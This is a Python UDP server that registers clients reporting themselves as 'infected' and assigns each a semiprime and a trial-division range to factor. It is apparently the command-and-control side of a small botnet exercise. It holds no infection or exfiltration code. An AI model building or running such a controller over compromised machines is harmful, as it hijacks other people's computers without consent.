import math
from socket import *
import time

SEND_PORT = 55554
RECEIVE_PORT = 55555
MSG_INFECTED = b'\x00'

STEP = 10 ** 8
CLIENT_MAP = {}

semis = [345533537 * 1258925411, 511729877 * 601989881, 785203469 * 35951863, 4085747551 * 360555127]
ranges = []

# i = 5915587277
# j = 1500450271


# Split and return a semiprime
def splitSemiPrime():
    global semis, ranges, STEP
    if len(semis) == 0:
        return -1
    semi = semis.pop()
    for i in range(2, int(math.sqrt(semi)) + 1, STEP):
        ranges.append(i)
    return semi


# return a new range
def get_new_range():
    global ranges
    if len(ranges) == 0:
        return -1
    return ranges.pop()


def main():
    global semis, ranges
    send_socket = socket(AF_INET, SOCK_DGRAM)
    send_socket.bind(('', SEND_PORT))
    receive_socket = socket(AF_INET, SOCK_DGRAM)
    receive_socket.bind(('', RECEIVE_PORT))
    semi = splitSemiPrime()
    print('Semi:', semi)
    print("Ranges:", ranges)
    print('ready')

    while True:
        message, (client_address, client_port) = receive_socket.recvfrom(2048)
        if message == MSG_INFECTED:
            if client_address not in CLIENT_MAP.keys():
                print('New Client infected! IP address: ' + client_address)
            # print('INFECTED received! Client ip: ' + client_address[0])
            # send semiprime
            send_message = semi.to_bytes(16, 'little')
            send_socket.sendto(send_message, (client_address, SEND_PORT))

            # send range
            range = get_new_range()
            if range != -1:
                print(f'Assigned range {range} to {client_address}')
                CLIENT_MAP[client_address] = range
                # print(CLIENT_MAP)
                send_message = range.to_bytes(16, 'little')
                send_socket.sendto(send_message, (client_address, SEND_PORT))
        else:
            result = int.from_bytes(message, 'little')
            print(f'Semi: {semi}, result: {result} received from {client_address}')
            ranges = []
            semi = splitSemiPrime()
            if semi == -1:
                break
            print("New semi:", semi)
            print("Ranges:", ranges)

    print('done')



main()

# send_socket = socket(AF_INET, SOCK_DGRAM)
# send_socket.bind(('', 12345))
# send_ip = ('127.0.0.1', 8)
# val = 50
# # send_socket.sendto(val.to_bytes(8, 'little'), send_ip)
# send_socket.sendto(val.to_bytes(8, 'little'), send_ip)
